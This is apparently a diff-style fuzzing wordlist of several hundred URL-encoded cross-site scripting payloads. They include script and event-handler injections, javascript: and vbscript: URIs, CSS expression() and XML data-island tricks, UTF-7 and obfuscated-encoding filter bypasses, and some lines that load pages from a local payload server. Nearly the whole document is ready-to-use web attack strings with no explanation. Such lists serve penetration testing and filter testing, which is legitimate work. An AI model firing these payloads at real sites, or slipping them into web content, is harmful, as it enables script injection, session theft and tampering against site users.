+'%3E%3C?import%20namespace=%22t%22%20implementation=%22  
+%3Cxml%20src=%22javascript:alert(1);%22%3E  
+%22%3E%3Cxml%20src=%22javascript:alert(1);%22%3E  
+'%3E%3Cxml%20src=%22javascript:alert(1);%22%3E  
+%3Cxml%20id=%22X%22%3E%3Ca%3E%3Cb%3E%3Cscript%3Ealert(1);%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1);%3C/script%3E  
+'%3E%3Cscript%3Ealert(1);%3C/script%3E;%3C/b%3E%3C/a%3E%3C/xml%3E  
+%3Cdiv%20datafld=%22b%22%20dataformatas=%22html%22%20datasrc=%22  
+%22%3E%3Cdiv%20datafld=%22b%22%20dataformatas=%22html%22%20datasrc=%22  
+'%3E%3Cdiv%20datafld=%22b%22%20dataformatas=%22html%22%20datasrc=%22  
+%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas]]%3E%3C![CDATA[cript:alert(1);%22%3E]]%3E%3C/C%3E%3C/X%3E%3C/xml%3E%3CSPAN%20DATASRC=  
+%22%3E%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas]]%3E%3C![CDATA[cript:alert(1);%22%3E]]%3E%3C/C%3E%3C/X%3E%3C/xml%3E%3CSPAN%20DATASRC=  
+'%3E%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas]]%3E%3C![CDATA[cript:alert(1);%22%3E]]%3E%3C/C%3E%3C/X%3E%3C/xml%3E%3CSPAN%20DATASRC=  
+%253cscript%253ealert(1)%253c/script%253e  
+foo/%E2%80%99;%20alert(1);//%E2%80%99;  
+[b][style=%22style=width:expre/**/ssion(alert(1))xt]bold[/style][/b]  
+[b][style=%22onmouseover=%22alert(1);]bold[/style][/b]  
+%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E  
+%22%3E%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E  
+'%3E%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E  
+%E2%80%98;%20alert(1);%20var%20foo=%E2%80%99  
+%3Cimg%20src=%22%22%20onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=%22%22%20onerror=alert(1)%3E  
+'%3E%3Cimg%20src=%22%22%20onerror=alert(1)%3E  
+%3Cimg%20src=%22%22%20onerror=alert(1);%3E  
+%22%3E%3Cimg%20src=%22%22%20onerror=alert(1);%3E  
+'%3E%3Cimg%20src=%22%22%20onerror=alert(1);%3E  
+%3E%3Cimg%20src=%22x:x%22%20onerror=alert(1)%3E  
+s%22%20style=x:expression(alert(1))  
+s%22%20style=%22background:url(javascript:alert(%E2%80%99X%E2%80%99))  
+s%22%20%22+STYLE%3D%22background-image%3A+expression%28alert%28%27X%3F%29%29  
+%22/%3E%3Cmeta%20http-equiv=refresh%20content=0;javascript:alert(1);%3E  
+%3CIMG%20SRC=%22%20%0E%20%20javascript:alert(1);%22%3E  
+%22%3E%3CIMG%20SRC=%22%20%0E%20%20javascript:alert(1);%22%3E  
+'%3E%3CIMG%20SRC=%22%20%0E%20%20javascript:alert(1);%22%3E  
+&lt;IMG%20SRC=%22%20&amp;  
+&lt;SCRIPT/X%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22&gt;&lt;/SCRIPT&gt;  
+&lt;SCRIPT/X%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22&gt;&lt;/SCRIPT&gt;  
+&lt;BODY%20onload!  
+&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;  
+&lt;IMG%20SRC=%22javascript:alert(1)%22  
+&lt;iframe%20src=http://127.0.0.1:3555/xss_serve_payloads/X.html%20&lt;  
+&lt;SCRIPT&gt;a=/X/  
+alert(a.source)&lt;/SCRIPT&gt;  
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(1);&lt;/SCRIPT&gt;  
+&lt;INPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:alert(1);%22&gt;  
+&lt;BODY%20BACKGROUND=%22javascript:alert(1)%22&gt;  
+&lt;BODY%20ONLOAD=alert(1)&gt;  
+&lt;IMG%20LOWSRC=%22javascript:alert(1)%22&gt;  
+&lt;BGSOUND%20SRC=%22javascript:alert(1);%22&gt;  
+&lt;BR%20SIZE=%22&%7Balert(1)%7D%22&gt;  
+&lt;STYLE&gt;li%20%7Blist-style-image:%20url(&quot;javascript:alert(&  
+&lt;IMG%20SRC='vbscript:msgbox(1)'&gt;  
+&lt;IMG%20SRC=%22mocha:[code]%22&gt;  
+&lt;IMG%20SRC=%22livescript:[code]%22&gt;  
+%3Cimg%20src='vbscript:document.location=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22'%3E  
+%22%3E%3Cimg%20src='vbscript:document.location=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22'%3E  
+'%3E%3Cimg%20src='vbscript:document.location=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22'%3E  
+&lt;META%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:alert(1);%22&gt;  
+&lt;META%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22&gt;  
+&lt;META%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:alert(1);%22&gt;  
+&lt;IFRAME%20SRC=%22javascript:alert(1);%22&gt;&lt;/IFRAME&gt;  
+&lt;FRAMESET&gt;&lt;FRAME%20SRC=%22javascript:alert(1);%22&gt;&lt;/FRAMESET&gt;  
+&lt;TABLE%20BACKGROUND=%22javascript:alert(1)%22&gt;  
+&lt;TABLE&gt;&lt;TD%20BACKGROUND=%22javascript:alert(1)%22&gt;  
+&lt;DIV%20STYLE=%22background-image:%20url(javascript:alert(1))%22&gt;  
+&lt;DIV%20STYLE=%22background-image:/0075/0072/006C/0028'/006a/0061/0076/0061/0073/0063/0072/0069/0070/0074/003a/0061/006c/0065/0072/0074/0028.1027/0058.1053/0053/0027/0029'/0029%22&gt;  
+&lt;DIV%20STYLE=%22background-image:%20url(&amp;  
+&lt;DIV%20STYLE=%22width:%20expression(alert(1));%22&gt;  
+&lt;STYLE&gt;@im/port'/ja/vasc/ript:alert(1)';&lt;/STYLE&gt;  
+&lt;IMG%20STYLE=%22X:expr/*X*/ession(alert(1))%22&gt;  
+&lt;X%20STYLE=%22X:expression(alert(1))%22&gt;  
+exp/*&lt;A%20STYLE='no/X:noX(%22*//*%22);  
+&lt;STYLE%20TYPE=%22text/javascript%22&gt;alert(1);&lt;/STYLE&gt;  
+&lt;STYLE&gt;.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D&lt;/STYLE&gt;&lt;A%20CLASS=X&gt;&lt;/A&gt;  
+&lt;STYLE%20type=%22text/css%22&gt;BODY%7Bbackground:url(%22javascript:alert(1)%22)%7D&lt;/STYLE&gt;  
+&lt;SCRIPT&gt;alert(1);&lt;/SCRIPT&gt;  
+&lt;BASE%20HREF=%22javascript:alert(1);//%22&gt;  
+&lt;OBJECT%20TYPE=%22text/x-scriptlet%22%20DATA=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22&gt;&lt;/OBJECT&gt;  
+&lt;OBJECT%20classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param%20name=url%20value=javascript:alert(1)&gt;&lt;/OBJECT&gt;  
+&lt;EMBED%20SRC=%22data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%20type=%22image/svg+xml%22%20AllowScriptAccess=%22always%22&gt;&lt;/EMBED&gt;  
+a=%22get%22;&  
+&lt;XML%20ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG%20SRC=%22javas]]&gt;&lt;![CDATA[cript:alert(1);%22&gt;]]&gt;  
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN%20DATASRC=  
+&lt;XML%20ID=0&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG%20SRC=%22javas&lt;!--%20--&gt;cript:alert(1)%22&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;  
+&lt;SPAN%20DATASRC=%22  
+&lt;SPAN%20DATASRC=  
+&lt;HTML&gt;&lt;BODY&gt;  
+&lt;?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22&gt;  
+&lt;?import%20namespace=%22t%22%20implementation=%22  
+&lt;t:set%20attributeName=%22innerHTML%22%20to=%22X&amp;lt;SCRIPT%20DEFER&amp;gt;alert(&amp;quot;X&amp;quot;)&amp;lt;/SCRIPT&amp;gt;%22&gt;  
+&lt;/BODY&gt;&lt;/HTML&gt;  
+&lt;?%20echo('&lt;SCR)';  
+echo('IPT&gt;alert(1)&lt;/SCRIPT&gt;');%20?&gt;  
+&lt;META%20HTTP-EQUIV=%22Set-Cookie%22%20Content=%22USERID=&amp;lt;SCRIPT&amp;gt;alert(1)&amp;lt;/SCRIPT&amp;gt;%22&gt;  
+&lt;HEAD&gt;&lt;META%20HTTP-EQUIV=%22CONTENT-TYPE%22%20CONTENT=%22text/html;%20charset=UTF-7%22&gt;%20&lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-  
+&lt;A%20HREF=%22http://www.google.com%22&gt;X&lt;/A&gt;  
+&lt;A%20HREF=%22http://1113982867/%22&gt;X&lt;/A&gt;  
+&lt;A%20HREF=%22http://0x42.0x0000066.0x7.0x93/%22&gt;X&lt;/A&gt;  
+&lt;A%20HREF=%22http://0102.0146.0007.00000223/%22&gt;X&lt;/A&gt;  
+&lt;A%20HREF=%22h&  
+&lt;A%20HREF=%22//127.0.0.1:3555/xss_serve_payloads/X.html%22&gt;X&lt;/A&gt;  
+&lt;A%20HREF=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22&gt;X&lt;/A&gt;  
+&lt;A%20HREF=%22http://127.0.0.1:3555/xss_serve_payloads/X.html./%22&gt;X&lt;/A&gt;  
+&lt;A%20HREF=%22javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'%22&gt;X&lt;/A&gt;  
+&lt;A%20HREF=%22http://www.keralacyberhttp://www.keralacyberforce.in/force.in/%22&gt;X&lt;/A&gt;  
+%3Cform%20id=%22test%22%20/%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:alert(1)%22%3EX  
+%22%3E%3Cform%20id=%22test%22%20/%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:alert(1)%22%3EX  
+'%3E%3Cform%20id=%22test%22%20/%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:alert(1)%22%3EX  
+%3Cinput%20onblur=javascript:alert(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cinput%20onblur=javascript:alert(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+'%3E%3Cinput%20onblur=javascript:alert(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+%3Cvideo%20poster=javascript:alert(1)//%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+%22%3E%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+'%3E%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+%22%3E%3Cvideo%20poster=javascript:alert(1)//%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+%22%3E%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+'%3E%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+'%3E%3Cvideo%20poster=javascript:alert(1)//%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+%22%3E%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+'%3E%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+%3Chead%3E%3Cbase%20href=%22javascript://%22/%3E%3C/head%3E%3Cbody%3E%3Ca%20href=%22/.%20/,alert(1)//  
+%22%3E%3Chead%3E%3Cbase%20href=%22javascript://%22/%3E%3C/head%3E%3Cbody%3E%3Ca%20href=%22/.%20/,alert(1)//  
+'%3E%3Chead%3E%3Cbase%20href=%22javascript://%22/%3E%3C/head%3E%3Cbody%3E%3Ca%20href=%22/.%20/,alert(1)//  
+%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Ealert(1)%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Ealert(1)%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Ealert(1)%3C/SCRIPT%3E  
+%3COBJECT%20CLASSID=%22clsid:333C7BC4-460F-11D0-BC04-0080C7055A83%22%3E%3CPARAM%20NAME=%22DataURL%22%20VALUE=%22javascript:alert(1)%22%3E%3C/OBJECT%3E  
+%22%3E%3COBJECT%20CLASSID=%22clsid:333C7BC4-460F-11D0-BC04-0080C7055A83%22%3E%3CPARAM%20NAME=%22DataURL%22%20VALUE=%22javascript:alert(1)%22%3E%3C/OBJECT%3E  
+'%3E%3COBJECT%20CLASSID=%22clsid:333C7BC4-460F-11D0-BC04-0080C7055A83%22%3E%3CPARAM%20NAME=%22DataURL%22%20VALUE=%22javascript:alert(1)%22%3E%3C/OBJECT%3E  
+%3Cembed%20src=%22data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E%3C/embed%3E  
+%22%3E%3Cembed%20src=%22data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E%3C/embed%3E  
+'%3E%3Cembed%20src=%22data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E%3C/embed%3E  
+%3Cform%20id=%22test%22%3E%3C/form%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:alert(1)%22%3EX%3C/button%3E  
+%22%3E%3Cform%20id=%22test%22%3E%3C/form%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:alert(1)%22%3EX%3C/button%3E  
+'%3E%3Cform%20id=%22test%22%3E%3C/form%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:alert(1)%22%3EX%3C/button%3E  
+%3Cb%20%3Cscript%3Ealert(1)//%3C/script%3E0%3C/script%3E%3C/b%3E  
+%22%3E%3Cb%20%3Cscript%3Ealert(1)//%3C/script%3E0%3C/script%3E%3C/b%3E  
+'%3E%3Cb%20%3Cscript%3Ealert(1)//%3C/script%3E0%3C/script%3E%3C/b%3E  
+%3Cscript%20src=%22javascript:alert(1)%22%3E  
+%22%3E%3Cscript%20src=%22javascript:alert(1)%22%3E  
+'%3E%3Cscript%20src=%22javascript:alert(1)%22%3E  
+%3Cimage%20src=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimage%20src=%22javascript:alert(1)%22%3E  
+'%3E%3Cimage%20src=%22javascript:alert(1)%22%3E  
+%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+%22%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+'%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex%3C/div%3E  
+%22%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+%22%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+'%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex%3C/div%3E  
+'%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+%22%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex  
+'%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=alert(1)%3Ex%3C/div%3E  
+%3C?%20foo=%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E  
+%3C!%20foo=%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E  
+%3C/%20foo=%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E  
+%3C?%20foo=%22%3E%3Cx%20foo='?%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E'%3E%22%3E  
+%3C!%20foo=%22[[[Inception]]%22%3E%3Cx%20foo=%22]foo%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E  
+%3Ciframe%20src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html%3E%3C/iframe%3E  
+%22%3E%3Ciframe%20src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html%3E%3C/iframe%3E  
+'%3E%3Ciframe%20src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html%3E%3C/iframe%3E  
+%3Ciframe%20src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html%3E%3C/iframe%3E  
+%22%3E%3Ciframe%20src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html%3E%3C/iframe%3E  
+'%3E%3Ciframe%20src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html%3E%3C/iframe%3E  
+%3Cdiv%20id=d%3E%3Cx%20xmlns=%22%3E%3Ciframe%20onload=alert(1)%22%3E%3C/div%3E%20%3Cscript%3Ed.innerHTML=d.innerHTML%3C/script%3E  
+%22%3E%3Cdiv%20id=d%3E%3Cx%20xmlns=%22%3E%3Ciframe%20onload=alert(1)%22%3E%3C/div%3E%20%3Cscript%3Ed.innerHTML=d.innerHTML%3C/script%3E  
+'%3E%3Cdiv%20id=d%3E%3Cx%20xmlns=%22%3E%3Ciframe%20onload=alert(1)%22%3E%3C/div%3E%20%3Cscript%3Ed.innerHTML=d.innerHTML%3C/script%3E  
+%3Cimg[a][b]src=x[d]onerror[c]=[e]%22alert(1)%22%3E  
+%22%3E%3Cimg[a][b]src=x[d]onerror[c]=[e]%22alert(1)%22%3E  
+'%3E%3Cimg[a][b]src=x[d]onerror[c]=[e]%22alert(1)%22%3E  
+%3Ca%20href=%22[a]java[b]script[c]:alert(1)%22%3EXXX%3C/a%3E  
+%22%3E%3Ca%20href=%22[a]java[b]script[c]:alert(1)%22%3EXXX%3C/a%3E  
+'%3E%3Ca%20href=%22[a]java[b]script[c]:alert(1)%22%3EXXX%3C/a%3E  
+%3Cimg%20src=%22x%60%20%60%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%60%20%60%3E  
+%3Cimg%20src%20onerror%20/%22%20'%22=%20alt=alert(1)//%22%3E  
+%22%3E%3Cimg%20src%20onerror%20/%22%20'%22=%20alt=alert(1)//%22%3E  
+'%3E%3Cimg%20src%20onerror%20/%22%20'%22=%20alt=alert(1)//%22%3E  
+%3Ctitle%20onpropertychange=alert(1)%3E%3C/title%3E%3Ctitle%20title=%3E%3C/title%3E  
+%22%3E%3Ctitle%20onpropertychange=alert(1)%3E%3C/title%3E%3Ctitle%20title=%3E%3C/title%3E  
+'%3E%3Ctitle%20onpropertychange=alert(1)%3E%3C/title%3E%3Ctitle%20title=%3E%3C/title%3E  
+%3Ca%20href=http://foo.bar/  
+%22%3E%3Ca%20href=http://foo.bar/  
+'%3E%3Ca%20href=http://foo.bar/  
+%3C!a%20foo=x=%60y%3E%3Cimg%20alt=%22%60%3E%3Cimg%20src=x:x%20onerror=alert(2)//%22%3E  
+%22%3E%3C!a%20foo=x=%60y%3E%3Cimg%20alt=%22%60%3E%3Cimg%20src=x:x%20onerror=alert(2)//%22%3E  
+'%3E%3C!a%20foo=x=%60y%3E%3Cimg%20alt=%22%60%3E%3Cimg%20src=x:x%20onerror=alert(2)//%22%3E  
+%3C?a%20foo=x=`y%3E%3Cimg%20alt=%22`%3E%3Cimg%20src=x:x%20onerror=alert(3)//%22%3E  
+%22%3E%3C?a%20foo=x=`y%3E%3Cimg%20alt=%22`%3E%3Cimg%20src=x:x%20onerror=alert(3)//%22%3E  
+'%3E%3C?a%20foo=x=`y%3E%3Cimg%20alt=%22`%3E%3Cimg%20src=x:x%20onerror=alert(3)//%22%3E  
+%3C!--[if]%3E%3Cscript%3Ealert(1)%3C/script%20--%3E  
+%22%3E%3C!--[if]%3E%3Cscript%3Ealert(1)%3C/script%20--%3E  
+'%3E%3C!--[if]%3E%3Cscript%3Ealert(1)%3C/script%20--%3E  
+%22%3E%3C!--[if]%3E%3Cscript%3Ealert(1)%3C/script%20--%3E  
+'%3E%3C!--[if]%3E%3Cscript%3Ealert(1)%3C/script%20--%3E  
+%3C!--[if%3Cimg%20src=x%20onerror=alert(2)//]%3E%20--%3E  
+%22%3E%3C!--[if%3Cimg%20src=x%20onerror=alert(2)//]%3E%20--%3E  
+'%3E%3C!--[if%3Cimg%20src=x%20onerror=alert(2)//]%3E%20--%3E  
+%3C!--%20%60%3Cimg/src=xx:xx%20onerror=alert(1)//--!%3E  
+%22%3E%3C!--%20%60%3Cimg/src=xx:xx%20onerror=alert(1)//--!%3E  
+'%3E%3C!--%20%60%3Cimg/src=xx:xx%20onerror=alert(1)//--!%3E  
+%3Cxmp%3E%20%3C%%20%3C/xmp%3E%20%3Cimg%20alt='%%3E%3C/xmp%3E%3Cimg%20src=xx:x%20onerror=alert(1)//'%3E%20%20%3Cscript%3E%20x='%3C%'%20%3C/script%3E%20%%3E/%20alert(2)%20%3C/scrip
+%22%3E%3Cxmp%3E%20%3C%%20%3C/xmp%3E%20%3Cimg%20alt='%%3E%3C/xmp%3E%3Cimg%20src=xx:x%20onerror=alert(1)//'%3E%20%20%3Cscript%3E%20x='%3C%'%20%3C/script%3E%20%%3E/%20alert(2)%20%3C/scrip
+'%3E%3Cxmp%3E%20%3C%%20%3C/xmp%3E%20%3Cimg%20alt='%%3E%3C/xmp%3E%3Cimg%20src=xx:x%20onerror=alert(1)//'%3E%20%20%3Cscript%3E%20x='%3C%'%20%3C/script%3E%20%%3E/%20alert(2)%20%3C/scrip
+%3Cframeset%20onload=alert(1)%3E  
+%22%3E%3Cframeset%20onload=alert(1)%3E  
+'%3E%3Cframeset%20onload=alert(1)%3E  
+%3Ctable%20background=%22javascript:alert(1)%22%3E%3C/table%3E  
+%22%3E%3Ctable%20background=%22javascript:alert(1)%22%3E%3C/table%3E  
+'%3E%3Ctable%20background=%22javascript:alert(1)%22%3E%3C/table%3E  
+%3C!--%3Cimg%20src=%22--%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%22%3E%3C!--%3Cimg%20src=%22--%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+'%3E%3C!--%3Cimg%20src=%22--%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=alert(1))//%22%3E  
+%22%3E%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=alert(1))//%22%3E  
+'%3E%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=alert(1))//%22%3E  
+%3Csvg%3E%3C![CDATA[%3E%3Cimage%20xlink:href=%22]]%3E%3Cimg%20src=xx:x%20onerror=alert(2)//%22%3E%3C/svg%3E  
+%22%3E%3Csvg%3E%3C![CDATA[%3E%3Cimage%20xlink:href=%22]]%3E%3Cimg%20src=xx:x%20onerror=alert(2)//%22%3E%3C/svg%3E  
+'%3E%3Csvg%3E%3C![CDATA[%3E%3Cimage%20xlink:href=%22]]%3E%3Cimg%20src=xx:x%20onerror=alert(2)//%22%3E%3C/svg%3E  
+%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%22%3E%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+'%3E%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%3Cli%20style=list-style:url()%20onerror=alert(1)%3E%3C/li%3E  
+%22%3E%3Cli%20style=list-style:url()%20onerror=alert(1)%3E%3C/li%3E  
+'%3E%3Cli%20style=list-style:url()%20onerror=alert(1)%3E%3C/li%3E  
+%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+%22%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+'%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E%3C/div%3E  
+%22%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+%22%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+'%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E%3C/div%3E  
+'%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+%22%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E  
+'%3E%3Cdiv%20style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden%20onload=alert(1)%3E%3C/div%3E  
+%3Ca%20style=%22-o-link:'javascript:alert(1)';-o-link-source:current%22%3EX%3C/a%3E  
+%22%3E%3Ca%20style=%22-o-link:'javascript:alert(1)';-o-link-source:current%22%3EX%3C/a%3E  
+'%3E%3Ca%20style=%22-o-link:'javascript:alert(1)';-o-link-source:current%22%3EX%3C/a%3E  
+%3Cstyle%3Ep[foo=bar%7B%7D*%7B-o-link:'javascript:alert(1)'%7D%7B%7D*%7B-o-link-source:current%7D*%7Bbackground:red%7D]%7Bbackground:green%7D;%3C/style%3E  
+%22%3E%3Cstyle%3Ep[foo=bar%7B%7D*%7B-o-link:'javascript:alert(1)'%7D%7B%7D*%7B-o-link-source:current%7D*%7Bbackground:red%7D]%7Bbackground:green%7D;%3C/style%3E  
+'%3E%3Cstyle%3Ep[foo=bar%7B%7D*%7B-o-link:'javascript:alert(1)'%7D%7B%7D*%7B-o-link-source:current%7D*%7Bbackground:red%7D]%7Bbackground:green%7D;%3C/style%3E  
+%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(write(1))%7d  
+%22%3E%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(write(1))%7d  
+'%3E%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(write(1))%7d  
+%3Cstyle%3E@import%20%22data:,*%7bx:expression(write(1))%7D%22;%3C/style%3E  
+%22%3E%3Cstyle%3E@import%20%22data:,*%7bx:expression(write(1))%7D%22;%3C/style%3E  
+'%3E%3Cstyle%3E@import%20%22data:,*%7bx:expression(write(1))%7D%22;%3C/style%3E  
+%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22alert(1);%22%3EXXX%3C/a%3E%3C/a%3E%3Ca%20href=%22javascript:alert(2)%22%3EXXX%3C/a%3E  
+%22%3E%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22alert(1);%22%3EXXX%3C/a%3E%3C/a%3E%3Ca%20href=%22javascript:alert(2)%22%3EXXX%3C/a%3E  
+'%3E%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22alert(1);%22%3EXXX%3C/a%3E%3C/a%3E%3Ca%20href=%22javascript:alert(2)%22%3EXXX%3C/a%3E  
+%3Cstyle%3E*[%7B%7D@import'test.css?]{color:%20green;}%3C/style%3EX  
+%22%3E%3Cstyle%3E*[%7B%7D@import'test.css?]{color:%20green;}%3C/style%3EX  
+'%3E%3Cstyle%3E*[%7B%7D@import'test.css?]{color:%20green;}%3C/style%3EX  
+*%20%7B-o-link:'javascript:alert(1)';-o-link-source:%20current;%7D  
+%3Cdiv%20style=%22font-family:'foo[a];color:red;';%22%3EXXX%3C/div%3E  
+%22%3E%3Cdiv%20style=%22font-family:'foo[a];color:red;';%22%3EXXX%3C/div%3E  
+'%3E%3Cdiv%20style=%22font-family:'foo[a];color:red;';%22%3EXXX%3C/div%3E  
+%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
+'%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EXXX%3C/div%3E  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
